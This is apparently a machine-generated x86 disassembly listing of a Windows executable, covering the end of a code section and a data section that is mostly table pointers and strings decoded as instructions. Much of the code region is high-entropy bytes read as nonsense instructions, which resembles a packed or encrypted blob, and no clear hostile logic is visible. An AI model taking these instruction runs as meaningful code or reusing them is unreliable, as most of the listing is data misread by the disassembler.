  41135c:	adc    bh,BYTE PTR [edi+0x7c]
  41135f:	jl     0x411305
  411361:	or     BYTE PTR [esi+ebp*1+0x65df79b],ch
  411368:	jo     0x41134f
  41136a:	jle    0x4113ae
  41136c:	dec    ebx
  41136d:	fld    TBYTE PTR [edx*8+0x3f818190]
  411374:	lahf   
  411375:	in     eax,dx
  411376:	pop    edi
  411377:	arpl   WORD PTR [edx+0x21],dx
  41137a:	rcl    DWORD PTR [ebx+0xf],cl
  41137d:	jns    0x4113e8
  41137f:	push   edi
  411380:	in     eax,dx
  411381:	dec    edi
  411382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411383:	push   es
  411384:	in     eax,0x29
  411386:	add    ecx,DWORD PTR [esi+0x4442cd1c]
  41138c:	ficom  DWORD PTR [ecx+0xf92d955]
  411392:	enter  0xb4f6,0x76
  411396:	inc    esi
  411397:	scas   al,BYTE PTR es:[edi]
  411398:	(bad)  [edx]
  41139a:	shl    DWORD PTR [ebp+0x123e8e0e],1
  4113a0:	push   edi
  4113a1:	(bad)  
  4113a2:	mov    esp,0x7b6b27bd
  4113a7:	cmp    eax,0xc3040398
  4113ac:	xchg   esp,eax
  4113ad:	in     eax,0xfa
  4113af:	sub    BYTE PTR [edx+edi*2-0x21],0xfa
  4113b4:	rcr    dh,0xa3
  4113b7:	das    
  4113b8:	or     BYTE PTR [ecx-0x595c8fcb],al
  4113be:	test   al,0x60
  4113c0:	mov    cl,0x26
  4113c2:	sub    BYTE PTR [ecx-0x7b],0x37
  4113c6:	dec    edi
  4113c7:	addr16 pop eax
  4113c9:	ret    0xc6ea
  4113cc:	dec    edx
  4113cd:	pop    ebx
  4113ce:	rcr    ebp,0xdf
  4113d1:	jbe    0x41141d
  4113d3:	pop    ss
  4113d4:	sti    
  4113d5:	pop    ecx
  4113d6:	mov    dl,0x67
  4113d8:	inc    edi
  4113d9:	out    dx,al
  4113da:	xchg   ebx,eax
  4113db:	cmp    DWORD PTR [edx],ecx
  4113dd:	pushf  
  4113de:	shl    edi,cl
  4113e0:	lock out dx,al
  4113e2:	cmp    ax,0x3f14
  4113e6:	cmp    eax,0xa285160e
  4113eb:	ret    0x72f8
  4113ee:	lods   eax,DWORD PTR ds:[esi]
  4113ef:	mov    eax,0x11c715b
  4113f4:	fisub  DWORD PTR [edi]
  4113f6:	jno    0x4113ad
  4113f8:	xchg   edx,eax
  4113f9:	inc    ecx
  4113fa:	fldl2t 
  4113fc:	jns    0x411443
  4113fe:	inc    ebp
  4113ff:	aad    0xdf
  411401:	std    
  411402:	mov    esp,0xb3216a4
  411407:	pop    edi
  411408:	xchg   esp,eax
  411409:	fstp   QWORD PTR [eax]
  41140b:	xor    BYTE PTR [edi-0x68],al
  41140e:	inc    esp
  41140f:	pop    edx
  411410:	lods   eax,DWORD PTR ds:[esi]
  411411:	mov    bh,0x2b
  411413:	das    
  411414:	popa   
  411415:	mov    fs,WORD PTR [edi-0x6f]
  411418:	sub    BYTE PTR [ebx],ch
  41141a:	or     bl,BYTE PTR [edx+edi*2]
  41141d:	xchg   ebp,eax
  41141e:	sub    al,0x88
  411420:	adc    al,0x3c
  411422:	sub    eax,0x8c59a4e2
  411427:	outs   dx,DWORD PTR ds:[esi]
  411428:	into   
  411429:	lods   eax,DWORD PTR ds:[esi]
  41142a:	bound  esp,QWORD PTR [edi-0x5eb63dca]
  411430:	test   BYTE PTR [esi+eax*1],dl
  411433:	jmp    0x1a46:0x482a63d
  41143a:	add    DWORD PTR [eax+0x71],esp
  41143d:	adc    BYTE PTR gs:[esi],bh
  411440:	xlat   BYTE PTR ds:[ebx]
  411441:	fwait
  411442:	pop    esi
  411443:	sub    BYTE PTR [ebp+0x69],cl
  411446:	in     al,dx
  411447:	fadd   DWORD PTR [eax-0x21]
  41144a:	hlt    
  41144b:	xlat   BYTE PTR ds:[ebx]
  41144c:	pop    ds
  41144d:	xchg   ebx,eax
  41144e:	sub    bl,BYTE PTR [eax+0x7c]
  411451:	ucomiss xmm6,DWORD PTR [ebx*4-0x4a030b39]
  411459:	faddp  st(3),st
  41145b:	or     al,0x7b
  41145d:	ret    0x39b7
  411460:	sbb    esi,DWORD PTR [ebx-0x7501ad50]
  411466:	push   esi
  411467:	lock (bad) 
  411469:	fiadd  WORD PTR [edi-0x13974e27]
  41146f:	push   ecx
  411470:	scas   al,BYTE PTR es:[edi]
  411471:	push   0x3c
  411473:	das    
  411474:	inc    edi
  411475:	std    
  411476:	int3   
  411477:	xchg   esp,eax
  411478:	rcr    dl,1
  41147a:	int    0x9d
  41147c:	aad    0xbd
  41147e:	dec    edx
  41147f:	inc    ebx
  411480:	add    ebx,DWORD PTR [edx+ebx*1]
  411483:	dec    ebx
  411484:	xor    edx,edx
  411486:	add    DWORD PTR [ebp-0xc],ebx
  411489:	pop    ebx
  41148a:	mov    eax,DWORD PTR [ebp-0xc]
  41148d:	pop    edi
  41148e:	pop    esi
  41148f:	pop    ebx
  411490:	leave  
  411491:	ret    0x10

Disassembly of section .data:

00412000 <.data>:
  412000:	and    BYTE PTR [ecx],ch
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    ch,BYTE PTR [ecx]
  412006:	add    DWORD PTR [eax],eax
  412008:	xor    al,0x29
  41200a:	add    DWORD PTR [eax],eax
  41200c:	inc    eax
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [edx+0x29],cl
  412012:	add    DWORD PTR [eax],eax
  412014:	pop    eax
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    BYTE PTR [edx+0x29],ah
  41201a:	add    DWORD PTR [eax],eax
  41201c:	je     0x412047
  41201e:	add    DWORD PTR [eax],eax
  412020:	jle    0x41204b
  412022:	add    DWORD PTR [eax],eax
  412024:	mov    WORD PTR [ecx],gs
  412026:	add    DWORD PTR [eax],eax
  412028:	xchg   esi,eax
  412029:	sub    DWORD PTR [ecx],eax
  41202b:	add    BYTE PTR [esi-0x4ffffed7],ah
  412031:	sub    DWORD PTR [ecx],eax
  412033:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41203a:	add    DWORD PTR [eax],eax
  41203c:	aam    0x29
  41203e:	add    DWORD PTR [eax],eax
  412040:	loopne 0x41206b
  412042:	add    DWORD PTR [eax],eax
  412044:	jmp    0x129:0xf2000129
  41204b:	add    BYTE PTR [eax],al
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    BYTE PTR [edx],cl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx+ebp*1],dl
  412056:	add    DWORD PTR [eax],eax
  412058:	and    ch,BYTE PTR [edx]
  41205a:	add    DWORD PTR [eax],eax
  41205c:	sub    al,0x2a
  41205e:	add    DWORD PTR [eax],eax
  412060:	xor    al,0x2a
  412062:	add    DWORD PTR [eax],eax
  412064:	inc    eax
  412065:	sub    al,BYTE PTR [ecx]
  412067:	add    BYTE PTR [edx+0x2a],cl
  41206a:	add    DWORD PTR [eax],eax
  41206c:	push   esp
  41206d:	sub    al,BYTE PTR [ecx]
  41206f:	add    BYTE PTR [esi+0x2a],bl
  412072:	add    DWORD PTR [eax],eax
  412074:	data16 sub al,BYTE PTR [ecx]
  412077:	add    BYTE PTR [eax+0x2a],dh
  41207a:	add    DWORD PTR [eax],eax
  41207c:	jp     0x4120a8
  41207e:	add    DWORD PTR [eax],eax
  412080:	sub    BYTE PTR [edx],0x1
  412083:	add    BYTE PTR [esi-0x65fffed6],cl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx-0x53fffed6],ah
  412091:	sub    al,BYTE PTR [ecx]
  412093:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  41209a:	add    DWORD PTR [eax],eax
  41209c:	retf   0x12a
  41209f:	add    ah,dl
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    dh,bl
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    dl,dh
  4120a9:	sub    al,BYTE PTR [ecx]
  4120ab:	add    dh,bh
  4120ad:	sub    al,BYTE PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [edx],bl
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [esi],ch
  4120b9:	sub    eax,DWORD PTR [ecx]
  4120bb:	add    BYTE PTR [esi],bh
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4120c3:	add    BYTE PTR [eax+0x2b],bl
  4120c6:	add    DWORD PTR [eax],eax
  4120c8:	push   0x7e00012b
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [edx-0x59fffed5],dl
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4120de:	add    DWORD PTR [eax],eax
  4120e0:	loopne 0x41210d
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	in     al,dx
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dh,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [esi],dl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [eax],ch
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],bh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [edx+0x2c],al
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	pop    eax
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [edx+0x2c],dh
  412102:	add    DWORD PTR [eax],eax
  412104:	jle    0x412132
  412106:	add    DWORD PTR [eax],eax
  412108:	mov    ch,BYTE PTR [ecx+eax*1]
  41210b:	add    BYTE PTR [esi-0x47fffed4],bl
  412111:	sub    al,0x1
  412113:	add    ah,al
  412115:	sub    al,0x1
  412117:	add    dl,dl
  412119:	sub    al,0x1
  41211b:	add    ah,ah
  41211d:	sub    al,0x1
  41211f:	add    al,dh
  412121:	sub    al,0x1
  412123:	add    BYTE PTR [esi],al
  412125:	sub    eax,0x2d140001
  41212a:	add    DWORD PTR [eax],eax
  41212c:	and    ch,BYTE PTR ds:0x2d300001
  412132:	add    DWORD PTR [eax],eax
  412134:	dec    edx
  412135:	sub    eax,0x2d5e0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	push   0x2d
  41213e:	add    DWORD PTR [eax],eax
  412140:	jp     0x41216f
  412142:	add    DWORD PTR [eax],eax
  412144:	xchg   esi,eax
  412145:	sub    eax,0x2da60001
  41214a:	add    DWORD PTR [eax],eax
  41214c:	mov    dh,0x2d
  41214e:	add    DWORD PTR [eax],eax
  412150:	(bad)  
  412151:	sub    eax,0x2dd20001
  412156:	add    DWORD PTR [eax],eax
  412158:	loop   0x412187
  41215a:	add    DWORD PTR [eax],eax
  41215c:	hlt    
  41215d:	sub    eax,0x2dfe0001
  412162:	add    DWORD PTR [eax],eax
  412164:	push   cs
  412165:	add    DWORD PTR cs:[eax],eax
  412168:	push   ds
  412169:	add    DWORD PTR cs:[eax],eax
  41216c:	sub    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	add    BYTE PTR [eax],al
  412172:	add    BYTE PTR [eax],al
  412174:	dec    edx
  412175:	add    DWORD PTR cs:[eax],eax
  412178:	add    BYTE PTR [eax],al
  41217a:	add    BYTE PTR [eax],al
  41217c:	push   0x8000012e
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	mov    WORD PTR [esi],gs
  412186:	add    DWORD PTR [eax],eax
  412188:	call   0x12e:0xb200012e
  41218f:	add    dh,al
  412191:	add    DWORD PTR cs:[eax],eax
  412194:	fsubr  QWORD PTR [esi]
  412196:	add    DWORD PTR [eax],eax
  412198:	call   0xf84122cb
  41219d:	add    DWORD PTR cs:[eax],eax
  4121a0:	adc    BYTE PTR [edi],ch
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	push   ds
  4121a5:	das    
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	xor    BYTE PTR [edi],ch
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	inc    eax
  4121ad:	das    
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	push   esi
  4121b1:	das    
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	data16 das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	jbe    0x4121e9
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	mov    ch,BYTE PTR [edi]
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	xchg   esi,eax
  4121c1:	das    
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c5:	das    
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    dl,0x2f
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	enter  0x12f,0x0
  4121d0:	loopne 0x412201
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	hlt    
  4121d5:	das    
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	add    dh,BYTE PTR [eax]
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	sbb    BYTE PTR [eax],dh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xor    BYTE PTR cs:[ecx],al
  4121e3:	add    BYTE PTR [edx],bh
  4121e5:	xor    BYTE PTR [ecx],al
  4121e7:	add    BYTE PTR [eax+0x30],cl
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   edx
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi+0x30],ah
  4121f2:	add    DWORD PTR [eax],eax
  4121f4:	jbe    0x412226
  4121f6:	add    DWORD PTR [eax],eax
  4121f8:	mov    dh,BYTE PTR [eax]
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	pushf  
  4121fd:	xor    BYTE PTR [ecx],al
  4121ff:	add    BYTE PTR [eax-0x3bfffed0],dh
  412205:	xor    BYTE PTR [ecx],al
  412207:	add    ah,dl
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    dl,ch
  41220d:	xor    BYTE PTR [ecx],al
  41220f:	add    BYTE PTR [edx],al
  412211:	xor    DWORD PTR [ecx],eax
  412213:	add    BYTE PTR [edx],bl
  412215:	xor    DWORD PTR [ecx],eax
  412217:	add    BYTE PTR [esi],ah
  412219:	xor    DWORD PTR [ecx],eax
  41221b:	add    BYTE PTR [eax],bh
  41221d:	xor    DWORD PTR [ecx],eax
  41221f:	add    BYTE PTR [edx+0x31],cl
  412222:	add    DWORD PTR [eax],eax
  412224:	push   esi
  412225:	xor    DWORD PTR [ecx],eax
  412227:	add    BYTE PTR [eax+0x31],ch
  41222a:	add    DWORD PTR [eax],eax
  41222c:	jbe    0x41225f
  41222e:	add    DWORD PTR [eax],eax
  412230:	xor    BYTE PTR [ecx],0x1
  412233:	add    BYTE PTR [esi-0x59fffecf],dl
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [eax-0x2dfffecf],bh
  412241:	xor    DWORD PTR [ecx],eax
  412243:	add    dl,ch
  412245:	xor    DWORD PTR [ecx],eax
  412247:	add    BYTE PTR [eax],al
  412249:	add    BYTE PTR [eax],al
  41224b:	add    BYTE PTR [esi],al
  41224d:	xor    al,BYTE PTR [ecx]
  41224f:	add    BYTE PTR [edx+esi*1],bl
  412252:	add    DWORD PTR [eax],eax
  412254:	xor    dh,BYTE PTR [edx]
  412256:	add    DWORD PTR [eax],eax
  412258:	inc    edx
  412259:	xor    al,BYTE PTR [ecx]
  41225b:	add    BYTE PTR [edx+0x32],dl
  41225e:	add    DWORD PTR [eax],eax
  412260:	pusha  
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax+0x32],dh
  412266:	add    DWORD PTR [eax],eax
  412268:	test   BYTE PTR [edx],dh
  41226a:	add    DWORD PTR [eax],eax
  41226c:	xchg   esp,eax
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [eax-0x41fffece],ch
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    ah,cl
  412279:	xor    al,BYTE PTR [ecx]
  41227b:	add    al,ah
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    al,dh
  412281:	xor    al,BYTE PTR [ecx]
  412283:	add    BYTE PTR [edx],al
  412285:	xor    eax,DWORD PTR [ecx]
  412287:	add    BYTE PTR [edx],bl
  412289:	xor    eax,DWORD PTR [ecx]
  41228b:	add    BYTE PTR [esi],ah
  41228d:	xor    eax,DWORD PTR [ecx]
  41228f:	add    BYTE PTR [ebx+esi*1],dh
  412292:	add    DWORD PTR [eax],eax
  412294:	inc    esp
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [edx+0x33],dl
  41229a:	add    DWORD PTR [eax],eax
  41229c:	push   0x7a000133
  4122a1:	xor    eax,DWORD PTR [ecx]
  4122a3:	add    BYTE PTR [esi-0x6bfffecd],al
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi-0x4bfffecd],ah
  4122b1:	xor    eax,DWORD PTR [ecx]
  4122b3:	add    dh,al
  4122b5:	xor    eax,DWORD PTR [ecx]
  4122b7:	add    al,bl
  4122b9:	xor    eax,DWORD PTR [ecx]
  4122bb:	add    dl,ch
  4122bd:	xor    eax,DWORD PTR [ecx]
  4122bf:	add    dl,bh
  4122c1:	xor    eax,DWORD PTR [ecx]
  4122c3:	add    BYTE PTR [esi],al
  4122c5:	xor    al,0x1
  4122c7:	add    BYTE PTR [esp+esi*1],bl
  4122ca:	add    DWORD PTR [eax],eax
  4122cc:	cmp    BYTE PTR [ecx+eax*1],dh
  4122cf:	add    BYTE PTR [edx+0x34],dl
  4122d2:	add    DWORD PTR [eax],eax
  4122d4:	data16 xor al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1+0x1],dh
  4122db:	add    BYTE PTR [eax-0x6dfffecc],al
  4122e1:	xor    al,0x1
  4122e3:	add    BYTE PTR [edx-0x51fffecc],ah
  4122e9:	xor    al,0x1
  4122eb:	add    BYTE PTR [edx-0x37fffecc],bh
  4122f1:	xor    al,0x1
  4122f3:	add    al,ah
  4122f5:	xor    al,0x1
  4122f7:	add    al,dh
  4122f9:	xor    al,0x1
  4122fb:	add    BYTE PTR [eax],cl
  4122fd:	xor    eax,0x351a0001
  412302:	add    DWORD PTR [eax],eax
  412304:	sub    dh,BYTE PTR ds:0x35380001
  41230a:	add    DWORD PTR [eax],eax
  41230c:	dec    edx
  41230d:	xor    eax,0x35580001
  412312:	add    DWORD PTR [eax],eax
  412314:	fs xor eax,0x35720001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	jl     0x412353
  41231e:	add    DWORD PTR [eax],eax
  412320:	xchg   esp,eax
  412321:	xor    eax,0x35a40001
  412326:	add    DWORD PTR [eax],eax
  412328:	mov    ah,0x35
  41232a:	add    DWORD PTR [eax],eax
  41232c:	ret    0x135
  41232f:	add    al,dl
  412331:	xor    eax,0x35e00001
  412336:	add    DWORD PTR [eax],eax
  412338:	div    BYTE PTR ds:0x36080001
  41233e:	add    DWORD PTR [eax],eax
  412340:	push   ss
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	sub    al,0x36
  412346:	add    DWORD PTR [eax],eax
  412348:	cmp    dh,BYTE PTR [esi]
  41234a:	add    DWORD PTR [eax],eax
  41234c:	push   edx
  41234d:	add    DWORD PTR ss:[eax],eax
  412350:	pop    esi
  412351:	add    DWORD PTR ss:[eax],eax
  412354:	push   0x36
  412356:	add    DWORD PTR [eax],eax
  412358:	jbe    0x412390
  41235a:	add    DWORD PTR [eax],eax
  41235c:	test   BYTE PTR [esi],dh
  41235e:	add    DWORD PTR [eax],eax
  412360:	xchg   esi,eax
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	mov    ds:0xb4000136,al
  412369:	add    DWORD PTR ss:[eax],eax
  41236c:	shl    BYTE PTR [esi],0x1
  41236f:	add    dh,cl
  412371:	add    DWORD PTR ss:[eax],eax
  412374:	fdiv   QWORD PTR [esi]
  412376:	add    DWORD PTR [eax],eax
  412378:	call   0xf64124b3
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	add    al,0x37
  412382:	add    DWORD PTR [eax],eax
  412384:	adc    al,0x37
  412386:	add    DWORD PTR [eax],eax
  412388:	es aaa 
  41238a:	add    DWORD PTR [eax],eax
  41238c:	cmp    al,0x37
  41238e:	add    DWORD PTR [eax],eax
  412390:	inc    esi
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	push   esp
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	fs aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	jbe    0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	test   BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	cwde   
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	mov    dl,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	les    esi,FWORD PTR [edi]
  4123ae:	add    DWORD PTR [eax],eax
  4123b0:	aam    0x37
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	call   0xfa4124f0
  4123b9:	aaa    
  4123ba:	add    DWORD PTR [eax],eax
  4123bc:	or     bh,BYTE PTR [eax]
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	push   ss
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],dh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	inc    esi
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123cf:	add    BYTE PTR [eax+0x38],bh
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	nop
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	mov    edx,0xc8000138
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    ah,ah
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    dl,dh
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    BYTE PTR [esi],al
  4123f1:	cmp    DWORD PTR [ecx],eax
  4123f3:	add    BYTE PTR [eax],bl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [edx],ch
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [edx],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax+0x39],dl
  412402:	add    DWORD PTR [eax],eax
  412404:	cmp    WORD PTR [ecx],ax
	...
  41240f:	add    dh,cl
  412411:	add    al,cl
  412413:	dec    ebp
  412414:	add    BYTE PTR [eax],al
  412416:	add    BYTE PTR [eax],al
  412418:	add    al,BYTE PTR [eax]
  41241a:	add    BYTE PTR [eax],al
  41241c:	dec    ebp
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx],bh
  412421:	cmp    DWORD PTR [ebx],eax
  412423:	add    BYTE PTR [edx],bh
  412425:	and    eax,DWORD PTR [ebx]
	...
  41242f:	add    dh,cl
  412431:	add    al,cl
  412433:	dec    ebp
  412434:	add    BYTE PTR [eax],al
  412436:	add    BYTE PTR [eax],al
  412438:	pop    esi
  412439:	and    al,0x1
  41243b:	add    BYTE PTR [ecx],al
  41243d:	add    BYTE PTR [eax],al
  41243f:	add    BYTE PTR [ecx],al
  412441:	add    BYTE PTR [eax],al
  412443:	add    BYTE PTR [ecx],al
  412445:	add    BYTE PTR [eax],al
  412447:	add    BYTE PTR [esp+0x1],dl
  41244b:	add    BYTE PTR [eax+0x24],bl
  41244e:	add    DWORD PTR [eax],eax
  412450:	pop    esp
  412451:	and    al,0x1
  412453:	add    BYTE PTR [esi+0x6f000032],al
  412459:	and    al,0x1
  41245b:	add    BYTE PTR [eax],al
  41245d:	add    BYTE PTR [esi+0x64],ch
  412460:	jae    0x4124d4
  412462:	bound  esp,QWORD PTR [esi+0x64]
  412465:	push   edi
  412466:	inc    si
  412468:	popa   
  412469:	xor    al,0x2e
  41246b:	je     0x4124dc
  41246d:	jo     0x41246f
  41246f:	aas    
  412470:	dec    eax
  412471:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  412479:	gs jb  0x4124cb
  41247c:	jb     0x4124e7
  41247e:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  412486:	inc    edi
  412487:	inc    esi
  412488:	dec    ebx
  412489:	push   eax
  41248a:	inc    ecx
  41248b:	dec    ecx
  41248c:	push   eax
  41248d:	inc    ecx
  41248e:	inc    esp
  41248f:	cmp    al,0x56
	...
  412499:	add    BYTE PTR [eax],al
  41249b:	add    BYTE PTR [eiz*1+0x1],dl
  4124a2:	add    BYTE PTR [eax],al
  4124a4:	add    BYTE PTR [eax],al
  4124a6:	add    BYTE PTR [eax],al
  4124a8:	push   cs
  4124a9:	sub    eax,DWORD PTR [ecx]
  4124ab:	add    BYTE PTR [eax],al
  4124ad:	and    BYTE PTR [ecx],al
  4124af:	add    al,cl
  4124b1:	and    eax,0x1
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	add    BYTE PTR [eax],al
  4124ba:	add    BYTE PTR [eax],al
  4124bc:	inc    eax
  4124bd:	add    DWORD PTR cs:[eax],eax
  4124c0:	mov    ah,0x20
  4124c2:	add    DWORD PTR [eax],eax
  4124c4:	mov    BYTE PTR [esi],ah
  4124c6:	add    DWORD PTR [eax],eax
	...
  4124d0:	pop    esp
  4124d1:	add    DWORD PTR cs:[eax],eax
  4124d4:	je     0x4124f7
  4124d6:	add    DWORD PTR [eax],eax
  4124d8:	nop
  4124d9:	add    DWORD PTR es:[eax],eax
	...
  4124e4:	clc    
  4124e5:	xor    DWORD PTR [ecx],eax
  4124e7:	add    BYTE PTR [ecx+eiz*1+0x1],bh
  4124eb:	add    BYTE PTR [eax+0x27],ah
  4124ee:	add    DWORD PTR [eax],eax
	...
  4124f8:	jb     0x412533
  4124fa:	add    DWORD PTR [eax],eax
  4124fc:	dec    esp
  4124fd:	and    al,BYTE PTR [ecx]
	...
  412513:	add    BYTE PTR [eax],ah
  412515:	sub    DWORD PTR [ecx],eax
  412517:	add    BYTE PTR [edx],ch
  412519:	sub    DWORD PTR [ecx],eax
  41251b:	add    BYTE PTR [ecx+ebp*1],dh
  41251e:	add    DWORD PTR [eax],eax
  412520:	inc    eax
  412521:	sub    DWORD PTR [ecx],eax
  412523:	add    BYTE PTR [edx+0x29],cl
  412526:	add    DWORD PTR [eax],eax
  412528:	pop    eax
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [edx+0x29],ah
  41252e:	add    DWORD PTR [eax],eax
  412530:	je     0x41255b
  412532:	add    DWORD PTR [eax],eax
  412534:	jle    0x41255f
  412536:	add    DWORD PTR [eax],eax
  412538:	mov    WORD PTR [ecx],gs
  41253a:	add    DWORD PTR [eax],eax
  41253c:	xchg   esi,eax
  41253d:	sub    DWORD PTR [ecx],eax
  41253f:	add    BYTE PTR [esi-0x4ffffed7],ah
  412545:	sub    DWORD PTR [ecx],eax
  412547:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41254e:	add    DWORD PTR [eax],eax
  412550:	aam    0x29
  412552:	add    DWORD PTR [eax],eax
  412554:	loopne 0x41257f
  412556:	add    DWORD PTR [eax],eax
  412558:	jmp    0x129:0xf2000129
  41255f:	add    BYTE PTR [eax],al
  412561:	sub    al,BYTE PTR [ecx]
  412563:	add    BYTE PTR [edx],cl
  412565:	sub    al,BYTE PTR [ecx]
  412567:	add    BYTE PTR [edx+ebp*1],dl
  41256a:	add    DWORD PTR [eax],eax
  41256c:	and    ch,BYTE PTR [edx]
  41256e:	add    DWORD PTR [eax],eax
  412570:	sub    al,0x2a
  412572:	add    DWORD PTR [eax],eax
  412574:	xor    al,0x2a
  412576:	add    DWORD PTR [eax],eax
  412578:	inc    eax
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+0x2a],cl
  41257e:	add    DWORD PTR [eax],eax
  412580:	push   esp
  412581:	sub    al,BYTE PTR [ecx]
  412583:	add    BYTE PTR [esi+0x2a],bl
  412586:	add    DWORD PTR [eax],eax
  412588:	data16 sub al,BYTE PTR [ecx]
  41258b:	add    BYTE PTR [eax+0x2a],dh
  41258e:	add    DWORD PTR [eax],eax
  412590:	jp     0x4125bc
  412592:	add    DWORD PTR [eax],eax
  412594:	sub    BYTE PTR [edx],0x1
  412597:	add    BYTE PTR [esi-0x65fffed6],cl
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x53fffed6],ah
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	retf   0x12a
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    dl,dh
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    dh,bh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	add    BYTE PTR [eax],al
  4125c7:	add    BYTE PTR [edx],bl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [esi],ch
